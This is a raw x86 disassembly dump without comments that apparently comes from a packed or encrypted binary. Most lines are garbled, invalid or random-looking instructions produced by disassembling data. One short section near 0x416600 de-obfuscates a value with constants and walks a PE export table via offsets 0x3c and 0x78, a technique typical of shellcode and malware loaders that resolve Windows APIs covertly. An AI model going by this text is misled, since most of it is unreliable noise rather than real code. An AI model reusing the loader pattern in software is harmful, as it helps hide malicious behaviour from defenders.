  4160ae:	dec    ebx
  4160af:	cmp    ebx,eax
  4160b1:	stc    
  4160b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160b3:	inc    ecx
  4160b4:	aaa    
  4160b5:	cdq    
  4160b6:	scas   al,BYTE PTR es:[edi]
  4160b7:	bound  esp,QWORD PTR [ecx+0x161c681e]
  4160bd:	adc    edi,edi
  4160bf:	jle    0x416109
  4160c1:	std    
  4160c2:	dec    ebx
  4160c3:	jne    0x416068
  4160c5:	ja     0x41608c
  4160c7:	jae    0x41607e
  4160c9:	cmp    BYTE PTR [eax],bh
  4160cb:	adc    BYTE PTR [ebp+0x31],ch
  4160ce:	pop    ss
  4160cf:	repz imul esp,DWORD PTR [ebp+0x715781fd],0xffffffb2
  4160d7:	ret    0xd11
  4160da:	ret    0x13c6
  4160dd:	or     BYTE PTR [ebx+0x5],cl
  4160e0:	ror    DWORD PTR [esi+0x65f495ae],0x98
  4160e7:	in     al,0x2e
  4160e9:	outs   dx,DWORD PTR ds:[esi]
  4160ea:	add    eax,edi
  4160ec:	mov    WORD PTR es:[ebx],?
  4160ef:	pop    es
  4160f0:	pop    esp
  4160f1:	icebp  
  4160f2:	jg     0x416135
  4160f4:	scas   eax,DWORD PTR es:[edi]
  4160f5:	xchg   esi,eax
  4160f6:	inc    edx
  4160f7:	ss in  eax,0xe6
  4160fa:	(bad)  
  4160fb:	(bad)  
  4160fc:	mov    cl,0x55
  4160fe:	jns    0x4160f9
  416100:	ss fwait
  416102:	inc    esi
  416103:	arpl   bx,di
  416105:	lock add BYTE PTR [esi+0x14062568],al
  41610c:	je     0x4160c8
  41610e:	cli    
  41610f:	mov    eax,0xd3c80f28
  416114:	pop    esp
  416115:	not    DWORD PTR gs:[edx]
  416118:	xchg   esi,eax
  416119:	ret    0x9a6
  41611c:	in     al,dx
  41611d:	outs   dx,BYTE PTR ds:[esi]
  41611e:	sub    ch,BYTE PTR [ebx+0x14]
  416121:	dec    ebp
  416122:	ds fadd st,st(0)
  416125:	clc    
  416126:	cdq    
  416127:	gs cmp al,0x9e
  41612a:	sbb    BYTE PTR [eax],bh
  41612c:	push   esp
  41612d:	pop    eax
  41612e:	ja     0x416128
  416130:	sbb    al,0xd1
  416132:	jno    0x4160df
  416134:	push   es
  416135:	jns    0x416140
  416137:	xchg   DWORD PTR [esp+eiz*4],ebx
  41613a:	adc    cl,dh
  41613c:	mov    BYTE PTR [ebp-0x373f17b3],bl
  416142:	daa    
  416143:	and    al,0xcd
  416145:	cmp    BYTE PTR [ebx+0x60ac5fa3],dh
  41614b:	aam    0xd1
  41614d:	mov    edx,0x1b1f3c0a
  416152:	jmp    0x2689b835
  416157:	mov    eax,0x21e1b1a3
  41615c:	pop    esi
  41615d:	adc    dl,BYTE PTR [ecx+0x26]
  416160:	int    0x6c
  416162:	pop    eax
  416163:	adc    BYTE PTR [edi+eiz*4-0x3a94f680],ch
  41616a:	sti    
  41616b:	test   al,0x2f
  41616d:	iret   
  41616e:	mul    DWORD PTR [edx+0xb]
  416171:	ja     0x4161cb
  416173:	pushf  
  416174:	add    DWORD PTR [esi+0x39108d3c],0x862d3d62
  41617e:	cmp    al,0x1f
  416180:	loop   0x41618f
  416182:	sti    
  416183:	dec    eax
  416184:	icebp  
  416185:	xchg   esi,eax
  416186:	xor    ebp,edx
  416188:	jl     0x416135
  41618a:	aam    0xc
  41618c:	imul   ebx,DWORD PTR [edi-0x5a],0x44977a9c
  416193:	aam    0x57
  416195:	ror    BYTE PTR [ebx-0x40],0x3f
  416199:	pop    es
  41619a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41619b:	cmp    ecx,DWORD PTR [ecx+0x60049bc7]
  4161a1:	jbe    0x416136
  4161a3:	(bad)  
  4161a4:	pop    DWORD PTR [edi-0x13]
  4161a7:	fcomp  DWORD PTR [edx-0x6f]
  4161aa:	xchg   ecx,eax
  4161ab:	fst    DWORD PTR [edi-0x25]
  4161ae:	pop    ebp
  4161af:	inc    esp
  4161b0:	adc    BYTE PTR [edi+esi*8+0x69],0xf8
  4161b5:	shr    ah,cl
  4161b7:	mov    bh,0x68
  4161b9:	jae    0x41619b
  4161bb:	call   0x15b3:0x7f7515d5
  4161c2:	add    eax,0xb0f14dc1
  4161c7:	lea    ebx,[ebp-0xc64b795]
  4161cd:	dec    ebp
  4161ce:	inc    esp
  4161cf:	dec    ecx
  4161d0:	xor    bl,BYTE PTR [edx-0x7e8533b8]
  4161d6:	or     DWORD PTR [eax],edi
  4161d8:	mov    WORD PTR [esp+esi*2+0x2d8bcda9],?
  4161df:	in     al,0x9f
  4161e1:	dec    esp
  4161e2:	mov    bl,0x61
  4161e4:	adc    ah,BYTE PTR [ebp+0x66ae1471]
  4161ea:	jo     0x4161bc
  4161ec:	sbb    cl,BYTE PTR [ebp-0xb7b579f]
  4161f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161f3:	add    al,0xf4
  4161f5:	ins    DWORD PTR es:[edi],dx
  4161f6:	ja     0x416238
  4161f8:	jbe    0x416216
  4161fa:	adc    DWORD PTR [edi+esi*4-0x55],0xffffffb9
  4161ff:	stos   BYTE PTR es:[edi],al
  416200:	addr16 dec ecx
  416202:	push   0xffffffc3
  416204:	sti    
  416205:	sbb    al,0xe2
  416207:	mov    ds:0x7a237212,eax
  41620c:	iret   
  41620d:	cmc    
  41620e:	pop    ds
  41620f:	call   0x331020b9
  416214:	and    ebx,DWORD PTR [eax+0x47]
  416217:	ins    DWORD PTR es:[edi],dx
  416218:	ret    0xfc6
  41621b:	fstp   QWORD PTR [edi-0x38]
  41621e:	sub    DWORD PTR [edi+0x66bdb8c5],0xb0d8205d
  416228:	js     0x4161bc
  41622a:	out    0x44,eax
  41622c:	adc    ecx,DWORD PTR [edx-0x39]
  41622f:	jne    0x416208
  416231:	and    esp,DWORD PTR [edi+0x5dfe0ced]
  416237:	mov    eax,0x2417ec1c
  41623c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41623d:	cli    
  41623e:	add    edi,DWORD PTR [ebx-0x45]
  416241:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416243:	int    0xf0
  416245:	clc    
  416246:	dec    ebx
  416247:	fnstcw WORD PTR [edx-0x31]
  41624a:	sbb    BYTE PTR [edi-0x57],cl
  41624d:	not    BYTE PTR [ebp-0x14b9339]
  416253:	pop    eax
  416254:	adc    al,0x65
  416256:	adc    esp,DWORD PTR [edi+0x37]
  416259:	test   BYTE PTR [ebx+ecx*8],0xc1
  41625d:	stc    
  41625e:	xchg   edi,eax
  41625f:	mov    eax,ds:0xb0c196d5
  416264:	loope  0x416258
  416266:	cmp    DWORD PTR [esi],edx
  416268:	jne    0x4161f2
  41626a:	push   ecx
  41626b:	mov    eax,ds:0x329c9d38
  416270:	sub    eax,0x90bd9d3b
  416275:	jb     0x416249
  416277:	pop    ebx
  416278:	push   esp
  416279:	or     ebp,DWORD PTR [esi-0x4a]
  41627c:	fst    DWORD PTR [ecx]
  41627e:	aad    0xf9
  416280:	outs   dx,BYTE PTR ds:[esi]
  416281:	pop    esp
  416282:	lock nop
  416284:	add    al,0x4b
  416286:	and    DWORD PTR [esi+edx*1+0x67],edx
  41628a:	cmp    DWORD PTR [edi+0x67],ebx
  41628d:	jno    0x4162be
  41628f:	mov    edx,0x2e675103
  416294:	ret    
  416295:	jo     0x4162ee
  416297:	xlat   BYTE PTR ds:[ebx]
  416298:	retf   0x9d8b
  41629b:	outs   dx,BYTE PTR ds:[esi]
  41629c:	pop    ebx
  41629d:	push   edi
  41629e:	and    BYTE PTR [ebx],bl
  4162a0:	loope  0x4162d9
  4162a2:	cmp    BYTE PTR [ecx+edx*8+0xd],bl
  4162a6:	push   ebp
  4162a7:	lock lods al,BYTE PTR ds:[esi]
  4162a9:	add    eax,0x7c46463c
  4162ae:	or     eax,0x5fd23532
  4162b3:	and    al,0xdd
  4162b5:	retf   
  4162b6:	inc    esp
  4162b7:	dec    ebx
  4162b8:	xchg   edi,eax
  4162b9:	imul   ecx
  4162bb:	pop    es
  4162bc:	fcom   DWORD PTR [ebx]
  4162be:	push   eax
  4162bf:	mov    ah,0x7f
  4162c1:	or     al,0xa1
  4162c3:	jmp    0x5852bc93
  4162c8:	in     eax,dx
  4162c9:	fimul  DWORD PTR [esi]
  4162cb:	sahf   
  4162cc:	cmp    al,0xd4
  4162ce:	dec    edx
  4162cf:	enter  0xe60c,0xd9
  4162d3:	std    
  4162d4:	test   al,0xcd
  4162d6:	dec    cl
  4162d8:	scas   al,BYTE PTR es:[edi]
  4162d9:	leave  
  4162da:	mov    bh,0x3a
  4162dc:	js     0x416260
  4162de:	div    BYTE PTR [esi+0x10d51948]
  4162e4:	pusha  
  4162e5:	sbb    esi,DWORD PTR [ecx]
  4162e7:	mov    al,ds:0xbb1051a7
  4162ec:	je     0x416355
  4162ee:	in     al,0x17
  4162f0:	ins    BYTE PTR es:[edi],dx
  4162f1:	fsubr  QWORD PTR [ecx]
  4162f3:	sbb    al,0x58
  4162f5:	sub    BYTE PTR [edi],ch
  4162f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f8:	and    esi,ecx
  4162fa:	popf   
  4162fb:	push   ds
  4162fc:	xor    al,0xe1
  4162fe:	push   ds
  4162ff:	int    0xed
  416301:	pop    ebp
  416302:	sbb    esi,DWORD PTR [ecx]
  416304:	sub    al,0xce
  416306:	ret    
  416307:	int3   
  416308:	cmp    dh,BYTE PTR [ecx+0x53b237a5]
  41630e:	add    ah,0xf8
  416311:	xor    eax,0x38357860
  416316:	sbb    BYTE PTR [edx-0x22444be7],dh
  41631c:	sahf   
  41631d:	cmp    dh,BYTE PTR [ebp+0x2bd9a963]
  416323:	cmp    DWORD PTR [esi+0x65],0x6f
  416327:	pop    ecx
  416328:	icebp  
  416329:	cmp    al,0xa
  41632b:	xchg   edi,eax
  41632c:	shl    esp,cl
  41632e:	and    esp,DWORD PTR [edx+0x43]
  416331:	dec    ebx
  416332:	xor    BYTE PTR gs:[eax+ebx*1-0xd642518],0xdf
  41633b:	rol    DWORD PTR [edx+0x4],cl
  41633e:	or     dl,BYTE PTR [ecx-0x71]
  416341:	adc    eax,esp
  416343:	jno    0x41630b
  416345:	or     edi,DWORD PTR [eax+0x4]
  416348:	iret   
  416349:	int3   
  41634a:	popa   
  41634b:	sbb    ch,BYTE PTR [esi]
  41634d:	aad    0x16
  41634f:	jns    0x416353
  416351:	mov    al,ds:0x22af6b9b
  416356:	aaa    
  416357:	sahf   
  416358:	ins    BYTE PTR es:[edi],dx
  416359:	(bad)
  41635d:	and    eax,0x5468f70a
  416362:	push   0x40
  416364:	jmp    0x6a56fcec
  416369:	mov    ah,0xdf
  41636b:	addr16 je 0x416305
  41636e:	jmp    0x416342
  416370:	xchg   ebx,eax
  416371:	inc    eax
  416372:	je     0x416351
  416374:	cmp    dl,0xbe
  416377:	sub    BYTE PTR [esi-0x21bb1fad],bl
  41637d:	(bad)  
  41637f:	sub    ecx,DWORD PTR [edi-0x18f4d908]
  416385:	popf   
  416386:	cli    
  416387:	out    dx,eax
  416388:	std    
  416389:	push   ss
  41638a:	or     edi,ebp
  41638c:	xor    eax,ebx
  41638e:	stos   BYTE PTR es:[edi],al
  41638f:	mov    dl,0x1d
  416391:	into   
  416392:	jmp    0x5c909efe
  416397:	lock xchg edx,eax
  416399:	ret    0xbf2d
  41639c:	iret   
  41639d:	dec    edi
  41639e:	ror    DWORD PTR [eax+ebx*8],cl
  4163a1:	nop
  4163a2:	adc    DWORD PTR [esi+ebx*8-0x51e28623],edi
  4163a9:	ss and eax,0x8da98700
  4163af:	lahf   
  4163b0:	pusha  
  4163b1:	stos   BYTE PTR es:[edi],al
  4163b2:	mov    edi,0x59ebc3d8
  4163b7:	push   edx
  4163b8:	(bad)  
  4163ba:	mov    ebx,0xb559b7c2
  4163bf:	mov    ch,0xcc
  4163c1:	mov    al,ds:0x206f2995
  4163c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163c7:	adc    BYTE PTR fs:[ecx+0x42c588b3],ah
  4163ce:	test   BYTE PTR [ebx],dl
  4163d0:	or     al,0x37
  4163d2:	clc    
  4163d3:	and    ecx,ecx
  4163d5:	sbb    al,0x5a
  4163d7:	add    DWORD PTR [esi+eax*2-0x5948f635],0xffffff9e
  4163df:	dec    eax
  4163e0:	or     esp,DWORD PTR ds:0xf5816bb2
  4163e6:	mov    dh,0xbb
  4163e8:	repz or bh,BYTE PTR [ebx+0x4b605ab1]
  4163ef:	pop    ss
  4163f0:	test   al,0xa3
  4163f2:	adc    bh,BYTE PTR [eax]
  4163f4:	icebp  
  4163f5:	sbb    dl,ch
  4163f7:	nop
  4163f8:	fwait
  4163f9:	dec    esi
  4163fa:	or     al,0xde
  4163fc:	or     edi,DWORD PTR [esp+ecx*2+0x4f4af196]
  416403:	arpl   bp,sp
  416405:	pop    es
  416406:	fwait
  416407:	cs jmp 0x88ce:0xeb4ea1ff
  41640f:	dec    esp
  416410:	or     BYTE PTR [edi-0x3be2a6b4],cl
  416416:	out    dx,al
  416417:	jp     0x4163ac
  416419:	retf   
  41641a:	push   esi
  41641b:	mov    eax,0x11b08412
  416420:	nop
  416421:	push   esi
  416422:	repnz fs out 0xb3,eax
  416426:	jnp    0x41641b
  416428:	pop    edx
  416429:	mov    ebp,0x59c59f58
  41642e:	xchg   BYTE PTR [ecx],ch
  416430:	mov    dh,0x4e
  416432:	mov    ds:0x4de07049,eax
  416437:	shr    dh,1
  416439:	neg    DWORD PTR [ecx]
  41643b:	xor    bh,BYTE PTR [ebp-0x51]
  41643e:	mov    ch,0xa
  416440:	add    edx,DWORD PTR [ebp-0x1bc8a944]
  416446:	bound  esp,QWORD PTR [edx]
  416448:	nop
  416449:	mov    ds:0x67636c3c,eax
  41644e:	xchg   cl,ch
  416450:	dec    edi
  416451:	bound  esi,QWORD PTR [ebx]
  416453:	sahf   
  416454:	xchg   esi,eax
  416455:	shr    DWORD PTR [edx+0xa71af33],0x7f
  41645c:	add    BYTE PTR [ecx-0x3bd6f013],dh
  416462:	in     eax,dx
  416463:	and    edi,DWORD PTR [esi+0x4d]
  416466:	cdq    
  416467:	push   edx
  416468:	cmp    eax,0xb0f84dd2
  41646d:	loop   0x41642b
  41646f:	add    BYTE PTR [edi+0x33],ch
  416472:	aas    
  416473:	mov    edi,0x10a3cebf
  416478:	sbb    ch,dl
  41647a:	fsub   QWORD PTR [edx-0xbc383da]
  416480:	pop    ebx
  416481:	imul   esp,DWORD PTR [eax-0x3f],0xabfb77cd
  416488:	or     BYTE PTR [edx+0x4b70325c],0x18
  41648f:	push   es
  416490:	lds    esi,FWORD PTR [eax]
  416492:	cmc    
  416493:	sbb    DWORD PTR [ebx-0x545b8d82],0x20
  41649a:	cld    
  41649b:	pop    esi
  41649c:	jo     0x416488
  41649e:	sar    BYTE PTR [ebx],1
  4164a0:	daa    
  4164a1:	xor    cl,BYTE PTR [edi+0x79]
  4164a4:	mov    ebp,0x916dc771
  4164a9:	push   0x30e87529
  4164ae:	and    DWORD PTR [edi],ebx
  4164b0:	jae    0x41643c
  4164b2:	out    dx,eax
  4164b3:	push   ebp
  4164b4:	daa    
  4164b5:	mov    al,0xf
  4164b7:	fwait
  4164b8:	cld    
  4164b9:	pop    ds
  4164ba:	adc    DWORD PTR [esi-0x2d],edi
  4164bd:	out    dx,eax
  4164be:	push   0xffffffe2
  4164c0:	dec    eax
  4164c1:	sbb    edx,ebp
  4164c3:	ret    0x6c64
  4164c6:	xchg   edi,eax
  4164c7:	out    0xf1,eax
  4164c9:	ins    BYTE PTR es:[edi],dx
  4164ca:	jo     0x416532
  4164cc:	popf   
  4164cd:	dec    edx
  4164ce:	sbb    eax,0xd3476c3
  4164d3:	add    dh,BYTE PTR [edi]
  4164d5:	adc    BYTE PTR [ecx+ecx*4-0x10],0xd
  4164da:	retf   
  4164db:	lock jmp DWORD PTR [ebp-0x732198a3]
  4164e2:	fwait
  4164e3:	mov    ebp,0x623846c0
  4164e8:	in     eax,dx
  4164e9:	imul   edi,DWORD PTR ds:0x9ee940b,0xbffc64f1
  4164f3:	xor    eax,0x600e5a36
  4164f8:	mov    eax,0xdf404f85
  4164fd:	xor    ah,al
  4164ff:	pop    ds
  416500:	inc    ebx
  416501:	out    0xb0,al
  416503:	push   0x53ac19fc
  416508:	and    ebp,ebp
  41650a:	add    DWORD PTR [ecx+0x6365e287],esp
  416510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416511:	arpl   bp,di
  416513:	mov    dh,0x3a
  416515:	mov    eax,0x7bd06d00
  41651a:	test   DWORD PTR [edx],esp
  41651c:	call   0xa299:0xb6c45363
  416523:	mov    ds:0x8a0c5133,eax
  416528:	mov    ebp,0x5eb8c346
  41652d:	mov    eax,0xbda244f1
  416532:	pop    ebp
  416533:	jge    0x41651f
  416535:	mov    ds,WORD PTR [edi-0x47]
  416538:	add    al,0x6d
  41653a:	adc    dh,BYTE PTR ds:0xb005662f
  416540:	mov    cs,ecx
  416542:	pop    edi
  416543:	push   eax
  416544:	push   edi
  416545:	mov    ds:0x5f8a8386,eax
  41654a:	loope  0x416596
  41654c:	leave  
  41654d:	(bad)  
  41654e:	jb     0x41659b
  416550:	outs   dx,DWORD PTR ds:[esi]
  416551:	sub    BYTE PTR [ebp-0x61],ah
  416554:	rol    eax,cl
  416556:	fiadd  DWORD PTR [eax+0x63]
  416559:	adc    eax,DWORD PTR ds:0x5889079d
  41655f:	fmul   st(2),st
  416561:	ss fwait
  416563:	adc    eax,0x818a50c9
  416568:	dec    esi
  416569:	sbb    eax,0x831c447f
  41656e:	xchg   ebx,eax
  41656f:	fdivrp st(4),st
  416571:	adc    DWORD PTR [ecx*4-0x4948f1f2],edx
  416578:	mov    cl,0x50
  41657a:	pop    eax
  41657b:	pushf  
  41657c:	jno    0x416531
  41657e:	lods   eax,DWORD PTR ds:[esi]
  41657f:	ret    0xf9cf
  416582:	fidivr WORD PTR [esi+ebx*4+0x1fb6c3da]
  416589:	mov    al,ds:0x13ab72e3
  41658e:	out    0xe5,eax
  416590:	push   0xf52b012
  416595:	xor    al,0x18
  416597:	push   ebx
  416598:	sar    BYTE PTR [esi+0x3e7b1db],0xf
  41659f:	dec    esp
  4165a0:	ins    DWORD PTR es:[edi],dx
  4165a1:	inc    eax
  4165a2:	lock or ch,BYTE PTR [ebp+esi*8+0x5b70a70f]
  4165aa:	xchg   esp,eax
  4165ab:	popf   
  4165ac:	adc    BYTE PTR [eax],cl
  4165ae:	xchg   ebx,eax
  4165af:	mov    bl,0x7d
  4165b1:	cmc    
  4165b2:	lock sbb BYTE PTR [ebx+eiz*4+0x4f],ah
  4165b7:	fisttp WORD PTR [ebx+0x3f5a60c8]
  4165bd:	sbb    DWORD PTR [esi+0x5f1b5cd0],edi
  4165c3:	mov    ch,0x56
  4165c5:	fidivr DWORD PTR [esi]
  4165c7:	cs and al,0xf2
  4165ca:	sub    eax,0x20ad94
  4165cf:	push   ds
  4165d0:	cmp    BYTE PTR [esi+0x7],bh
  4165d3:	popa   
  4165d4:	sahf   
  4165d5:	xchg   ebp,eax
  4165d6:	pop    edx
  4165d7:	aad    0x57
  4165d9:	and    eax,0xc0ee994a
  4165de:	cmp    eax,DWORD PTR ds:0xe5821521
  4165e4:	das    
  4165e5:	(bad)  
  4165e7:	jge    0x4165f5
  4165e9:	in     eax,0x63
  4165eb:	dec    eax
  4165ec:	dec    ecx
  4165ed:	jg     0x416616
  4165ef:	fild   DWORD PTR [esi+0x233346ad]
  4165f5:	scas   al,BYTE PTR es:[edi]
  4165f6:	fstp   QWORD PTR [edi-0x7af0715b]
  4165fc:	and    al,BYTE PTR [eax]
  4165fe:	add    BYTE PTR [eax],al
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    al,BYTE PTR [eax+0x4e]
  416674:	fdiv   QWORD PTR [edx+0x626123db]
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	xor    esi,DWORD PTR [ebp+0x774cdf23]
  416684:	in     eax,dx
  416685:	addr16 out dx,eax
  416687:	jle    0x416701
  416689:	push   esp
  41668a:	imul   edx,DWORD PTR [esp+eax*4-0x7f],0x7e
  41668f:	push   ebx
  416690:	add    al,0x57
  416692:	push   0x2d
  416694:	xor    eax,0x26fa6e53
  416699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41669a:	icebp  
  41669b:	jecxz  0x416620
  41669d:	jae    0x4166c1
  41669f:	pop    edi
  4166a0:	lock lds ecx,FWORD PTR [ebp-0xf697992]
  4166a7:	sbb    BYTE PTR [esi],dh
  4166a9:	add    ch,dh
  4166ab:	lahf   
  4166ac:	cmc    
  4166ad:	lds    edx,FWORD PTR [eax+ebp*4+0x78]
  4166b1:	add    ebx,DWORD PTR [eax]
  4166b3:	js     0x4166d8
  4166b5:	jg     0x4166d9
  4166b7:	paddw  mm6,QWORD PTR [ebx]
  4166ba:	aad    0xd0
  4166bc:	ret    
  4166bd:	sub    eax,0x5f4c994e
  4166c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166c3:	out    dx,eax
  4166c4:	daa    
  4166c5:	ins    DWORD PTR es:[edi],dx
  4166c6:	and    DWORD PTR ds:0x972d74fd,ebp
  4166cc:	cwde   
  4166cd:	adc    eax,0x95267bf6
  4166d2:	pop    edi
  4166d3:	pushf  
  4166d4:	stos   BYTE PTR es:[edi],al
  4166d5:	or     al,dl
  4166d7:	lods   al,BYTE PTR ds:[esi]
  4166d8:	test   DWORD PTR [ebp+0x37db50a8],eax
  4166de:	xchg   ebx,eax
  4166df:	fidivr DWORD PTR [eax+0x5e0afcf0]
  4166e5:	push   eax
  4166e6:	xchg   ebx,eax
  4166e7:	xor    DWORD PTR [edi+0x59d7d80f],ebx
  4166ed:	jmp    0x8a28:0x1fd5161f
  4166f4:	int3   
  4166f5:	dec    esp
  4166f6:	icebp  
  4166f7:	jle    0x41669b
  4166f9:	fs daa 
  4166fb:	push   ebp
  4166fc:	adc    ah,BYTE PTR [edi+eax*4-0x33a3e8b7]
  416703:	inc    ebp
  416704:	imul   DWORD PTR [ecx+ebp*4-0x3a]
  416708:	xchg   ebx,eax
  416709:	fwait
  41670a:	out    dx,eax
  41670b:	inc    esp
  41670c:	mov    esi,0x9741450
  416711:	mov    al,ds:0xc5bcf578
  416716:	mov    edx,0xf03ad4da
  41671b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41671c:	jmp    0x416794
  41671e:	cmp    al,0xe9
  416720:	pop    edx
  416721:	leave  
  416722:	(bad)  
  416723:	out    0xbf,al
  416725:	mov    ebp,0x122ddfd
  41672a:	sbb    edi,edi
  41672c:	add    bl,dh
  41672e:	fiadd  DWORD PTR [ebx+0x185b1499]
  416734:	add    BYTE PTR [ebx-0x3a],al
  416737:	push   cs
  416738:	test   eax,0xe1d77e91
  41673d:	mov    WORD PTR [esi-0x29d0bf9e],cs
  416743:	sub    edx,eax
  416745:	push   esp
  416746:	inc    esp
  416747:	(bad)  
  416748:	(bad)  
  416749:	cmp    DWORD PTR [ebp-0x4e05b360],eax
  41674f:	and    al,0xbb
  416751:	addr16 das 
  416753:	sbb    al,0x65
  416755:	adc    edi,edx
  416757:	lods   al,BYTE PTR ds:[esi]
  416758:	fisttp DWORD PTR [edx-0x69]
  41675b:	pop    esp
  41675c:	inc    ecx
  41675d:	mov    ebx,0xc9201f4d
  416762:	inc    eax
  416763:	push   0xffffffae
  416765:	mov    cl,0xa
  416767:	stos   DWORD PTR es:[edi],eax
  416768:	or     DWORD PTR [ecx+eiz*4-0x3de192e0],ebx
  41676f:	test   BYTE PTR [edx],dl
  416771:	out    0xae,al
  416773:	jmp    0x4c90e297
  416778:	dec    esp
  416779:	psubw  mm5,QWORD PTR [ebx-0x6e]
  41677d:	mov    dh,0xfd
  41677f:	add    dl,BYTE PTR [ebx+0x66]
  416782:	call   0xe569:0x57bc618c
  416789:	es sub eax,0x1fa07df0
  41678f:	add    ebx,DWORD PTR [esi]
  416791:	cmp    edi,DWORD PTR [ecx-0x3a]
  416794:	lahf   
  416795:	xchg   ebx,eax
  416796:	dec    eax
  416797:	adc    edi,ebx
  416799:	lea    edx,[eax-0x42]
  41679c:	pop    edx
  41679d:	push   0x2e35e606
  4167a2:	xchg   edx,eax
  4167a3:	push   DWORD PTR [eax+0x20]
  4167a6:	mov    al,ds:0x1076ec2a
  4167ab:	dec    esi
  4167ac:	into   
  4167ad:	loope  0x4167d1
  4167af:	xor    ch,BYTE PTR [ebp+0x13]
  4167b2:	nop
  4167b3:	and    BYTE PTR [ecx-0x52],ch
  4167b6:	push   cs
  4167b7:	jae    0x4167ce
  4167b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167ba:	loop   0x4167bd
  4167bc:	mov    eax,ds:0xff2de6b8
  4167c1:	call   0x7c172d92
  4167c6:	ds jne 0x416797
  4167c9:	loop   0x41679e
  4167cb:	jge    0x4167bf
  4167cd:	jae    0x416845
  4167cf:	cmp    al,0x44
  4167d1:	popa   
  4167d2:	icebp  
  4167d3:	aas    
  4167d4:	inc    ebp
  4167d5:	fwait
  4167d6:	les    edi,FWORD PTR [ebx+0x1a]
  4167d9:	(bad)  
  4167db:	lea    ebx,[ebp+0x4423a712]
  4167e1:	pop    ebp
  4167e2:	dec    esp
  4167e3:	xchg   DWORD PTR [eax],esp
  4167e5:	mov    dl,0xa2
  4167e7:	xchg   ecx,eax
  4167e8:	lsl    ebp,ax
  4167eb:	lods   al,BYTE PTR ds:[esi]
  4167ec:	push   ebp
  4167ed:	sbb    al,0x7a
  4167ef:	push   0x7e
  4167f1:	push   ds
  4167f2:	xchg   edi,eax
  4167f3:	mov    eax,ds:0x14a1ee06
  4167f8:	cmp    BYTE PTR [edx+ebp*2-0x7e],0xbf
  4167fd:	push   ds
  4167fe:	ins    DWORD PTR es:[edi],dx
  4167ff:	scas   al,BYTE PTR es:[edi]
  416800:	call   0x752:0xfbbd0b46
  416807:	push   ds
  416808:	(bad)  
  416809:	jbe    0x41683d
  41680b:	stc    
  41680c:	sub    ch,al
  41680e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41680f:	loopne 0x4167f3
  416811:	mov    esp,0x7ccab07c
  416816:	cmp    al,BYTE PTR [ebp-0x6dd98db5]
  41681c:	hlt    
  41681d:	mul    BYTE PTR [edi-0x12]
  416820:	xor    BYTE PTR [esi-0x51fb283f],al
  416826:	dec    ecx
  416827:	push   ebp
  416828:	jle    0x416894
  41682a:	loopne 0x41684c
  41682c:	push   esi
  41682d:	bound  ebx,QWORD PTR [ebx+ebx*2]
  416830:	sub    BYTE PTR [esi+0x44],cl
  416833:	clc    
  416834:	jmp    0x416836
  416836:	js     0x4168b1
  416838:	xor    cl,BYTE PTR [ebx-0x1e4cf978]
  41683e:	(bad)  
  41683f:	mov    bl,0xff
  416841:	jbe    0x4167e8
  416843:	imul   esp,DWORD PTR [edi-0x7],0x58aa1114
  41684a:	and    BYTE PTR [esi+ebp*1+0x5e],bh
  41684e:	ds pusha 
  416850:	in     al,0xb6
  416852:	rol    esp,1
  416854:	cwde   
  416855:	mov    DWORD PTR [ebx+0x73],esp
  416858:	cmp    DWORD PTR [eax*8+0x6542da92],edi
  41685f:	je     0x416809
  416861:	pop    es
  416862:	mov    ch,0xad
  416864:	add    edx,DWORD PTR [ecx]
  416866:	test   eax,0x98066dee
  41686b:	das    
  41686c:	ret    
  41686d:	loop   0x4168e6
  41686f:	sbb    DWORD PTR [edx],edx
  416871:	js     0x4168cd
  416873:	icebp  
  416874:	xchg   esi,eax
  416875:	retf   
  416876:	loop   0x416867
  416878:	pop    esp
  416879:	test   bl,bl
  41687b:	jmp    DWORD PTR ds:0x4ad8f21f
  416881:	call   0x70ed:0x52d7953e
  416888:	scas   al,BYTE PTR es:[edi]
  416889:	or     esi,DWORD PTR [esi+0x52ef6760]
  41688f:	mov    edx,0x5b6234d8
  416894:	xchg   edx,eax
  416895:	cmp    al,0x4f
  416897:	js     0x416838
  416899:	jne    0x4168dd
  41689b:	ret    
  41689c:	sub    eax,0xafa6dce9
  4168a1:	mov    dh,0x81
  4168a3:	mov    dl,BYTE PTR [ebp+0x76]
  4168a6:	jbe    0x416910
  4168a8:	dec    esi
